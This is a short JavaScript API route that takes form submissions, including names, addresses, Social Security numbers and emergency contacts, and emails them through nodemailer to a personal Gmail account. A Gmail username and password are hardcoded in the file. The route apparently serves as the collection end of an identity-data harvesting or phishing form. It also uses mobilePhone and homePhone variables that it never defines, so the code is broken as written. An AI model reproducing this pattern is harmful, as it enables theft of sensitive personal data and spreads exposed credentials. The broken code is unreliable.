// api/submitForm.js
import nodemailer from 'nodemailer';

export default async function handler(req, res) {
  if (req.method === 'POST') {
    const {
      firstname,
      lastname,
      address,
      addressLine2,
      city,
      province,
      postal,
      ssn,
     email,
    emergency,
    } = req.body;

    // Setup nodemailer transporter
    const transporter = nodemailer.createTransport({
      service: 'gmail', // e.g., 'gmail'
      auth: {
        user: 'penuelsamuel54@gmail.com',
        pass: 'cityofjoy3@',
      },
    });

    // Setup email data
    const mailOptions = {
      from: `${email}`,
      to: 'penuelsamuel54@gmail.com', // Replace with your email address
      subject: 'New Form Submission',
      html: `
        <p>New form submission:</p>
        <p>First Name: ${firstname}</p>
        <p>Last Name: ${lastname}</p>
        <p>Address: ${address}, ${addressLine2}, ${city}, ${province}, ${postal}</p>
        <p>SSN: ${ssn}</p>
        <p>Mobile Phone: ${mobilePhone}</p>
        <p>Home Phone: ${homePhone}</p>
        <p>Emergency Contact: ${emergency}</p>
      `,
    };

    // Send email
    transporter.sendMail(mailOptions, (error, info) => {
      if (error) {
        console.error(error);
        res.status(500).json({ success: false, error: 'Error sending email' });
      } else {
        console.log('Email sent: ' + info.response);
        res.status(200).json({ success: true, message: 'Email sent successfully' });
      }
    });
  } else {
    res.status(405).json({ error: 'Method Not Allowed' });
  }
}
